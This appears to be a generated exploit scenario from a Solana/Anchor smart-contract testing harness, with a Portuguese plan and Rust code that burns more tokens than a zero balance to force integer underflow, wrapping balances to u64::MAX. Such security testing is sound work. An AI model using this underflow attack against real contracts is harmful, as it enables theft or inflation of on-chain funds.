{
  "plan": "Inicializamos o ledger com total_supply=1000 e user_balance=0 via a instrucao initialize (baseline). Em seguida, chamamos burn com amount=1, que e maior que user_balance=0, para tentar causar underflow. O ataque deve fazer user_balance e total_supply darem a volta para u64::MAX e u64::MAX-1, respectivamente. Medimos o efeito lendo os campos apos o ataque e verificando se ocorreu wrap-around (user_balance == u64::MAX).",
  "scenario": "let authority = Pubkey::new_unique();
let ledger_key = Pubkey::new_unique();

// Conta ledger vazia para init
let ledger_account = empty_account();
let authority_account = wallet(1_000_000_000);
let (system_program_id, system_program_account) = system_program_account();

// Baseline: initialize com initial_supply = 1000
let ix_init = env.anchor_ix(
    "initialize",
    &(1000u64,),
    vec![
        AccountMeta::new(ledger_key, true),
        AccountMeta::new(authority, true),
        AccountMeta::new_readonly(system_program_id, false),
    ],
);
let accounts_init = vec![
    (ledger_key, ledger_account),
    (authority, authority_account),
    (system_program_id, system_program_account),
];
let r_init = env.baseline("initialize ledger", &ix_init, &accounts_init);
assert!(r_init.program_result == ProgramResult::Success);

// Extrai a conta ledger resultante
let ledger_after_init = r_init.resulting_accounts.iter().find(|(k, _)| *k == ledger_key).map(|(_, a)| a.clone()).unwrap();

// Ataque: burn com amount = 1 (maior que user_balance = 0)
let ix_burn = env.anchor_ix(
    "burn",
    &(1u64,),
    vec![
        AccountMeta::new(ledger_key, false),
        AccountMeta::new_readonly(authority, true),
    ],
);
let accounts_burn = vec![
    (ledger_key, ledger_after_init),
    (authority, wallet(1_000_000_000)),
];
let r_attack = env.attack("burn with amount > user_balance", &ix_burn, &accounts_burn);

if r_attack.program_result == ProgramResult::Success {
    let ledger_data = after(&r_attack, &ledger_key).data();
    // Layout: 8 bytes discriminator + 32 bytes authority + 8 bytes total_supply + 8 bytes user_balance
    let total_supply = read_u64(ledger_data, 40);
    let user_balance = read_u64(ledger_data, 48);
    env.effect("user_balance underflowed to u64::MAX", user_balance == u64::MAX);
    env.effect("total_supply underflowed to u64::MAX - 1", total_supply == u64::MAX - 1);
}"
}

